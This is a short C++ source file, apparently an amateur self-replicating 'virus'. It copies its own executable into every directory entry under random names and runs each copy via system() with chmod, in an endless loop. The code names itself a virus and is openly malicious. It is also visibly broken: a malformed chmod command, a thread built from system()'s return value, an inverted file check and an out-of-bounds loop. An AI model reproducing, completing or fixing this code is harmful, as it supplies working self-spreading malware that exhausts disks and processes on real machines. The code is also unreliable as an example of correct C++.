#include <vector>
#include <bitset>
#include <regex>
#include <thread>
#include <cstdlib>
#include <fstream>
#include <dirent.h>
#include <iostream>

using namespace std;
namespace fs = std::filesystem;
//variables
regex correctFile("(a)+([0-9]?)+(.*)");
// detect archives
regex itsAFile("[\\w\\d\\- ]+(\\.*)");

// prototypes
void ListDir(const string &, vector<string> &);
void writeFiles(vector<string>);

int main()
{
  vector<string> files;
  ListDir("./", files);
  writeFiles(files);

  return 0;
}

// get the directorys
void ListDir(const string &path, vector<string> &files)
{
  struct dirent *entry;
  DIR *dp;
  dp = opendir(path.c_str());

  if (dp == NULL)

    perror("opendir: Path does not exist or could not be read.");

  while ((entry = readdir(dp)))
    files.push_back(entry->d_name);

  closedir(dp);
}
// write the file
void writeFiles(vector<string> files)
{

  string file = "a.out";
  do
  {
    for (int i = 0; i <= files.size(); i++)
    {
      try
      {
        if (regex_match(files[i], correctFile))
          file = files[i]; // get the file

        // get the directories
        if (!regex_match(files[i], itsAFile) == 0 || files[i] == "." || files[i] == "..")
        {
          // generate the name
          string nameVirus = (files[i] + "/a" + to_string(rand()) + ".bin");
          // get the file
          ifstream fileVirus(file, ios::binary);
          // create the file
          ofstream copyVirus(nameVirus, ios::binary);
          if (!fileVirus.is_open())
            copyVirus << fileVirus.rdbuf(); // copy the file

          fileVirus.close();
          thread comm(system("chmod 775" + nameVirus + ";" + nameVirus));
          comm.join(); // idk what im doing here 😩
        }
      }
      catch (...)
      {
        cout << "fuck" << endl;
      }
    }
  } while (true);
}
